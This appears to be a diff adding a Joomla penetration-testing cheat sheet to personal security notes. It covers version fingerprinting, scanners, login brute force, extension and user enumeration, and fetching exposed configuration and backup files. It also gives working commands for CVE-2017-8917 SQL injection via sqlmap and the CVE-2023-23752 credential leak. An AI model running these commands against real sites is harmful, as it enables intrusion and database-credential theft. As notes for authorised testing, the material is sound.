@@ -111,6 +111,81 @@ Attackers rarely drop a plaintext shell. A common pattern wraps the payload in `
 - **Reporting it:** note the obfuscation as an IOC and recommend file-integrity monitoring + blocking PHP execution in upload dirs.
 I don't store working shell payloads in this repo.
 
+## Joomla — discovery, enum & attacking (reference)
+Target placeholder `<URL>`.
+
+### Identify Joomla
+```bash
+curl -s <URL>/ | grep -i joomla
+curl -s <URL>/robots.txt
+curl -s <URL>/README.txt                                       # version
+curl -s <URL>/administrator/manifests/files/joomla.xml         # detailed version
+curl -s <URL>/plugins/system/cache/cache.xml                   # approx version
+curl -I <URL>/favicon.ico                                      # default favicon
+```
+Fingerprint from several sources (README + joomla.xml + cache.xml) for an accurate version — it drives which exploits apply.
+
+### Version via headers / changelog
+```bash
+curl -I <URL>/ | grep "X-Content-Encoded-By"
+curl -s <URL>/CHANGELOG.php
+```
+
+### Automated scanners
+```bash
+droopescan scan joomla --url <URL>/
+python2.7 joomlascan.py -u <URL>/
+```
+
+### Login brute force (scope + approval only)
+```bash
+python3 joomla-brute.py -u <URL> -w <wordlist> -usr admin
+```
+
+### Extension enumeration (common vuln source)
+```bash
+curl -s <URL>/components/
+curl -s <URL>/modules/
+curl -s <URL>/plugins/
+curl -s <URL>/templates/
+curl -s <URL>/media/
+```
+
+### Config / backup exposure
+```bash
+curl -s <URL>/configuration.php        # sensitive: DB creds; also .bak
+curl -s <URL>/configuration.php.bak
+curl -s <URL>/backup.zip
+curl -s <URL>/joomla.sql
+```
+
+### REST API / user enum
+```bash
+curl -s <URL>/api/index.php/v1/users
+curl -X POST -d "username=admin" "<URL>/index.php?option=com_users&view=reset"
+```
+
+### Directory / file discovery
+```bash
+dirb <URL> /usr/share/wordlists/dirb/common.txt
+```
+
+### Known CVEs
+```bash
+# SQLi CVE-2017-8917
+sqlmap -u "<URL>/index.php?option=com_content&id=1" --dbs --batch
+# CVE-2023-23752 — unauth info disclosure (leaks config incl. DB creds)
+curl -X GET "<URL>/api/index.php/v1/config/application?public=true"
+```
+
+### Log checks
+```bash
+curl -s <URL>/logs/error.php
+curl -s <URL>/logs/debug.log
+```
+
+> `configuration.php` exposure and CVE-2023-23752 both leak DB credentials — critical findings. Brute-force and SQLi are intrusive: scope + approval only.
+
 ### My notes / lab output
 Filled in once I run this on a WordPress target.
 
